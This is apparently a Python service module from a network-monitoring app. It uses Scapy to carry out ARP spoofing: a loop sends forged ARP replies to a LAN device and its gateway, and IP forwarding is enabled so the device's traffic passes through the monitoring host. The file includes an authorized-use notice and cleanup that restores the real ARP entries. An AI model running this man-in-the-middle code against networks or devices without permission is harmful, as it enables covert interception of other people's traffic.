"""
app/services/arp_redirect_service.py

SAFETY / AUTHORIZED-USE NOTICE
------------------------------
This module temporarily adjusts local ARP tables so that a target device's traffic on the SAME
LAN becomes visible to this monitoring host -- necessary because normal WiFi hardware and modern
per-session WiFi encryption prevent one device from passively seeing another device's traffic,
even on the same network. This is the same underlying mechanism used by legitimate network
analysis and IDS tools (e.g. arpspoof, Ettercap, Bettercap) for authorized traffic inspection.

USE THIS ONLY on networks and devices YOU OWN or have explicit permission to test (e.g. your own
home/lab LAN, your own phone acting as a test IoT device, for a supervised academic project).
Never use this against a network or device you do not own or lack authorization to test.

Every call to start_redirect() has a matching stop_redirect() that restores the real ARP entries
on both ends -- this is called automatically on normal stop, and via the safety-net shutdown
hooks below if the backend process exits unexpectedly, so a crashed session never leaves the
target device's real connectivity broken.
"""

import atexit
import logging
import re
import threading
import time
import subprocess
import platform
from typing import Any

from scapy.all import ARP, Ether, conf, srp, sendp, getmacbyip

log = logging.getLogger("kronos.arp_redirect")

# Module-level registry so start/stop is idempotent and the shutdown safety net knows what to clean up
_active_redirects: dict[str, dict] = {}
_lock = threading.Lock()


def resync_network_state():
    """
    Force Scapy to reload OS routing tables, network interfaces, and flush
    any cached ARP entries so network transitions (e.g. switching Wi-Fi) are detected live.
    """
    try:
        conf.route.resync()
    except Exception as exc:
        log.debug(f"conf.route.resync error: {exc}")
    try:
        conf.ifaces.reload()
    except Exception as exc:
        log.debug(f"conf.ifaces.reload error: {exc}")
    try:
        if hasattr(conf, "netcache") and hasattr(conf.netcache, "arp_cache"):
            conf.netcache.arp_cache.flush()
    except Exception as exc:
        log.debug(f"netcache flush error: {exc}")


def _is_virtual_or_vmware(iface: Any) -> bool:
    """Check if an interface name or description matches virtual or VMware adapters."""
    text = " ".join([
        str(iface),
        getattr(iface, "name", "") or "",
        getattr(iface, "description", "") or "",
        getattr(iface, "network_name", "") or "",
    ]).lower()
    bad_keywords = ["vmware", "vmnet", "virtualbox", "vbox", "loopback", "pseudo", "teredo", "isatap"]
    return any(kw in text for kw in bad_keywords)


def _is_valid_lan_ip(ip: str | None) -> bool:
    """Check if IP is a valid routable IPv4 address on a real LAN (non-loopback, non-APIPA)."""
    if not ip or not isinstance(ip, str) or "." not in ip:
        return False
    if ip.startswith("127.") or ip.startswith("169.254.") or ip.startswith("0.") or ip == "255.255.255.255":
        return False
    if ip.startswith("224.") or ip.startswith("239."):
        return False
    return True


def _get_route_for_target(target_ip: str) -> tuple[str, str, str]:
    """
    Determine the correct default gateway, network interface, and local IP to reach target_ip.
    Live re-evaluates the active interface and route, skipping virtual/VMware adapters.

    Scapy's conf.route.route(dst) returns: (iface, output_ip, gateway_ip)
    - iface: the network interface used to reach the destination
    - output_ip: this host's own IP address on that interface
    - gateway_ip: the next-hop gateway (or '0.0.0.0' if target_ip is on-link / same LAN)

    Returns:
        tuple[str, str, str]: (gateway_ip, iface, own_ip)
    """
    resync_network_state()

    route_res = conf.route.route(target_ip)
    if not route_res:
        raise RuntimeError(
            f"Could not determine a network route to reach {target_ip}. "
            f"Confirm the IP address is valid and connected to the local network."
        )

    iface, own_ip, route_gw = route_res

    # Check if target is this machine's own IP or loopback
    if target_ip == own_ip or iface == conf.loopback_name or "loopback" in str(iface).lower():
        raise RuntimeError(
            f"Target IP ({target_ip}) is this host machine itself. In ARP monitoring, "
            f"the target must be another endpoint device on your network (e.g. IoT camera, smartphone, or laptop)."
        )

    # If route_res picked a virtual / VMware adapter or invalid IP, find the real LAN adapter
    if _is_virtual_or_vmware(iface) or not _is_valid_lan_ip(own_ip):
        found_real = False
        for net, mask, r_gw, r_iface, r_out_ip, _metric in sorted(conf.route.routes, key=lambda r: r[5] if len(r) > 5 else 999):
            if net == 0 and mask == 0 and _is_valid_lan_ip(r_gw) and _is_valid_lan_ip(r_out_ip):
                if not _is_virtual_or_vmware(r_iface):
                    iface = r_iface if isinstance(r_iface, str) else getattr(r_iface, "name", str(r_iface))
                    own_ip = r_out_ip
                    route_gw = r_gw
                    found_real = True
                    break
        if not found_real:
            raise RuntimeError(
                f"Could not find an active non-virtual network interface to reach {target_ip}."
            )

    # For local subnet destinations, route_gw is '0.0.0.0' (on-link / directly connected).
    # To redirect traffic between the target and the network gateway, we look up
    # the default gateway for this specific interface.
    if not route_gw or route_gw == "0.0.0.0":
        def_route = conf.route.route("0.0.0.0", dev=iface)
        if def_route and def_route[2] and def_route[2] != "0.0.0.0" and not _is_virtual_or_vmware(def_route[0]):
            route_gw = def_route[2]
        else:
            # Fallback: inspect conf.route.routes for default route (0.0.0.0/0) on this interface
            for net, mask, r_gw, r_iface, _out_ip, _metric in sorted(conf.route.routes, key=lambda r: r[5] if len(r) > 5 else 999):
                if net == 0 and mask == 0 and r_gw and r_gw != "0.0.0.0":
                    if (
                        r_iface == iface
                        or getattr(r_iface, "name", None) == iface
                        or getattr(r_iface, "network_name", None) == iface
                    ) and not _is_virtual_or_vmware(r_iface):
                        route_gw = r_gw
                        break

    if not route_gw or route_gw == "0.0.0.0":
        raise RuntimeError(
            f"Could not determine a valid default gateway on interface '{iface}' to monitor {target_ip}. "
            f"Confirm this host is connected to a network with an active router/gateway."
        )

    log.info(f"[NETWORK_DETECT] Interface selected: '{iface}' | Current IP: {own_ip} | Gateway IP: {route_gw}")
    return route_gw, iface, own_ip


def is_gateway(ip: str, gateway_ip: str | None = None) -> bool:
    """
    Single unified function to determine if a given IP address is the LAN default gateway.
    Uses interface-specific route resolution (_get_route_for_target) to reliably identify the
    gateway without being misled by virtual adapters (e.g., VMware, VPNs).

    Logs the IP being checked, the resolved gateway it compared against, and the network
    interface that gateway resolution came from.
    """
    try:
        resolved_gateway, iface, own_ip = _get_route_for_target(ip)
        actual_gateway = gateway_ip or resolved_gateway
        is_gw = bool(actual_gateway and ip == actual_gateway)
        log.info(
            f"[GATEWAY_CHECK] ip={ip} | resolved_gateway={actual_gateway} | "
            f"iface='{iface}' | is_gateway={is_gw}"
        )
        return is_gw
    except Exception as exc:
        log.info(
            f"[GATEWAY_CHECK] ip={ip} | error='{exc}' | is_gateway=False"
        )
        return False


def get_active_network() -> tuple[str | None, str, str | None]:
    """
    Return (interface_name, own_ip, default_gateway_ip) using interface-specific route resolution.
    Live re-detects the active non-virtual interface and gateway on every call.
    """
    resync_network_state()
    try:
        gw_ip, iface, own_ip = _get_route_for_target("8.8.8.8")
        return iface, own_ip, gw_ip
    except Exception as e:
        log.warning(f"Could not determine active network via internet route: {e}")
        # Search for lowest metric default route on a real physical LAN interface
        for net, mask, r_gw, r_iface, r_out_ip, _metric in sorted(conf.route.routes, key=lambda r: r[5] if len(r) > 5 else 999):
            if net == 0 and mask == 0 and _is_valid_lan_ip(r_gw) and _is_valid_lan_ip(r_out_ip):
                if not _is_virtual_or_vmware(r_iface):
                    iface_name = r_iface if isinstance(r_iface, str) else getattr(r_iface, "name", str(r_iface))
                    log.info(f"[NETWORK_DETECT] Interface selected (fallback): '{iface_name}' | Current IP: {r_out_ip} | Gateway IP: {r_gw}")
                    return iface_name, r_out_ip, r_gw
        return None, "127.0.0.1", None


def _resolve_mac(ip: str, iface: str, timeout: float = 3.0, retries: int = 3) -> str | None:
    """Resolve an IP's MAC address via a fresh ARP request, explicitly sent on the CORRECT
    interface, clearing any stale cached entries first."""
    # Requirement 5: Clear/flush stale Scapy ARP cache entries so network transitions use fresh requests
    try:
        if hasattr(conf, "netcache") and hasattr(conf.netcache, "arp_cache"):
            conf.netcache.arp_cache.flush()
    except Exception as e:
        log.debug(f"Could not flush netcache before ARP resolution: {e}")

    for attempt in range(retries):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered, _ = srp(pkt, timeout=timeout, iface=iface, verbose=False)
            if answered:
                resolved = answered[0][1].hwsrc
                log.info(f"[ARP_RESOLVE] Fresh ARP reply for {ip} on '{iface}': {resolved}")
                return resolved
            log.warning(
                f"[ARP_RESOLVE] No ARP reply resolving MAC for {ip} on interface '{iface}' "
                f"(attempt {attempt + 1}/{retries})"
            )
        except Exception as e:
            log.warning(f"[ARP_RESOLVE] Error during ARP resolution for {ip} on '{iface}': {e}")

    # Fallback to querying fresh OS ARP table entry for this IP only if live ARP packet was dropped
    try:
        out = subprocess.check_output(["arp", "-a", ip], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            m = re.match(r"\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([0-9a-fA-F-]+)\s+(\w+)", line)
            if m and m.group(1) == ip:
                mac = m.group(2).replace("-", ":").lower()
                if mac != "ff:ff:ff:ff:ff:ff":
                    log.info(f"[ARP_RESOLVE] Resolved MAC for {ip} via OS arp table: {mac}")
                    return mac
    except Exception as e:
        log.debug(f"OS arp lookup failed for {ip}: {e}")

    return None


def _set_ip_forwarding(enabled: bool) -> bool:
    """
    Enables/disables OS-level IP forwarding so the target device's traffic, once redirected
    through this host, still reaches its real destination (the device keeps working normally).
    Requires Administrator/root. Returns True on success, False if it couldn't be changed.
    """
    try:
        if platform.system() == "Windows":
            value = "enabled" if enabled else "disabled"
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "global", f"forwarding={value}"],
                check=True, capture_output=True, timeout=10,
            )
        else:
            value = "1" if enabled else "0"
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=True, capture_output=True, timeout=10)
        return True
    except Exception as e:
        log.error(f"Could not {'enable' if enabled else 'disable'} IP forwarding "
                  f"(are you running as Administrator/root?): {e}")
        return False


def _redirect_loop(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str,
                    iface: str, stop_event: threading.Event):
    """Background loop: periodically asserts this host's presence to both sides so traffic
    keeps flowing through here for as long as monitoring is active. All packets are pinned to
    the specific interface determined for this target via sendp Layer 2 frames."""
    if target_ip == gateway_ip:
        # Target is the gateway itself (e.g. mobile hotspot camera endpoint).
        # Direct traffic on iface already reaches this host without ARP spoofing.
        stop_event.wait()
        return

    while not stop_event.is_set():
        try:
            # Tell the target: "I am the gateway"
            sendp(
                Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
                iface=iface,
                verbose=False,
            )
            # Tell the gateway: "I am the target"
            sendp(
                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
                iface=iface,
                verbose=False,
            )
        except Exception as e:
            log.error(f"Redirect loop error for {target_ip}: {e}")
        stop_event.wait(2.0)


def start_redirect(target_ip: str, gateway_ip: str | None = None) -> dict:
    """
    Begins on-path traffic visibility for target_ip. Idempotent: calling this again for an
    already-active target_ip is a no-op that returns the existing state, rather than stacking
    duplicate background threads.
    """
    with _lock:
        if target_ip in _active_redirects:
            log.info(f"Redirect already active for {target_ip}, skipping duplicate start.")
            return {"status": "already_active", "target_ip": target_ip}

        auto_gateway, iface, own_ip = _get_route_for_target(target_ip)
        actual_gateway_ip = gateway_ip or auto_gateway

        if target_ip == own_ip:
            raise RuntimeError(
                f"Target IP ({target_ip}) is this machine's own IP address. In ARP monitoring, "
                f"the target must be another device on your network (e.g. IoT camera, smartphone, or laptop)."
            )

        is_hotspot_camera = False
        if is_gateway(target_ip, gateway_ip=actual_gateway_ip):
            # Check if target is a fingerprinted camera endpoint (e.g., phone running IP Webcam on a hotspot)
            from app.services.discovery_service import fingerprint_device
            fp = fingerprint_device(target_ip)
            if fp.get("device_type") not in ("ip_camera_phone", "ip_camera"):
                raise RuntimeError(
                    f"Target IP ({target_ip}) is your LAN gateway / router. In ARP traffic monitoring, "
                    f"the target must be an endpoint device (e.g. IoT camera, smartphone, smart TV) "
                    f"whose traffic to/from the gateway you want to inspect, rather than the gateway itself."
                )
            is_hotspot_camera = True

        target_mac = _resolve_mac(target_ip, iface)
        gateway_mac = _resolve_mac(actual_gateway_ip, iface)
        if not target_mac or not gateway_mac:
            target_status = target_mac if target_mac else "None (unreachable)"
            gateway_status = gateway_mac if gateway_mac else "None (unreachable)"
            raise RuntimeError(
                f"Could not resolve MAC address for target ({target_status}) or gateway ({gateway_status}) "
                f"on interface '{iface}'. Confirm both target ({target_ip}) and gateway ({actual_gateway_ip}) "
                f"are online and reachable on this LAN. If VMware/VPN software is running, its virtual adapters "
                f"can sometimes interfere -- try temporarily disabling unused virtual network adapters and retry."
            )

        forwarding_ok = False
        if not is_hotspot_camera:
            forwarding_ok = _set_ip_forwarding(True)
            if not forwarding_ok:
                raise RuntimeError(
                    "Could not enable IP forwarding -- run the backend as Administrator/root, "
                    "then try starting monitoring again."
                )

        stop_event = threading.Event()
        thread = threading.Thread(
            target=_redirect_loop,
            args=(target_ip, actual_gateway_ip, target_mac, gateway_mac, iface, stop_event),
            daemon=True,
        )
        thread.start()

        _active_redirects[target_ip] = {
            "gateway_ip": actual_gateway_ip,
            "target_mac": target_mac,
            "gateway_mac": gateway_mac,
            "iface": iface,
            "stop_event": stop_event,
            "thread": thread,
            "we_enabled_forwarding": forwarding_ok,
        }

        log.info(f"Traffic visibility started for {target_ip} (via gateway {actual_gateway_ip} on '{iface}')")
        return {"status": "started", "target_ip": target_ip, "gateway_ip": actual_gateway_ip, "interface": iface}


def stop_redirect(target_ip: str) -> dict:
    """
    Restores real ARP entries on both ends and stops the background thread. Always safe to call,
    even if start_redirect only partially succeeded -- this must never raise, since it's the
    critical cleanup step that leaves the target device's real connectivity intact.
    """
    with _lock:
        state = _active_redirects.pop(target_ip, None)

    if state is None:
        log.info(f"No active redirect found for {target_ip} -- nothing to stop.")
        return {"status": "not_active", "target_ip": target_ip}

    state["stop_event"].set()
    state["thread"].join(timeout=5)

    gateway_ip = state["gateway_ip"]
    target_mac = state["target_mac"]
    gateway_mac = state["gateway_mac"]
    iface = state["iface"]

    # Send corrective ARP replies restoring the REAL MAC addresses -- repeated a few times for
    # reliability, since a single unicast ARP reply can be missed
    if target_ip != gateway_ip:
        try:
            for _ in range(5):
                sendp(
                    Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac),
                    iface=iface,
                    verbose=False,
                )
                sendp(
                    Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac),
                    iface=iface,
                    verbose=False,
                )
                time.sleep(0.3)
            log.info(f"Restored real ARP entries for {target_ip} and {gateway_ip}.")
        except Exception as e:
            log.error(f"Error sending corrective ARP replies for {target_ip}: {e}")

    if state["we_enabled_forwarding"]:
        _set_ip_forwarding(False)

    return {"status": "stopped", "target_ip": target_ip}


def stop_all_redirects():
    """Safety-net cleanup: stops every currently active redirect. Called on unexpected shutdown."""
    for target_ip in list(_active_redirects.keys()):
        try:
            stop_redirect(target_ip)
        except Exception as e:
            log.error(f"Failed to cleanly stop redirect for {target_ip} during shutdown: {e}")


def get_redirect_info(target_ip: str) -> dict | None:
    """Return the redirect info dict for a specific target, or None."""
    with _lock:
        return _active_redirects.get(target_ip)


def get_status() -> dict:
    with _lock:
        return {
            "active_targets": list(_active_redirects.keys()),
            "count": len(_active_redirects),
        }


# --- Safety net: never leave a device's ARP table corrupted if the backend crashes ---
atexit.register(stop_all_redirects)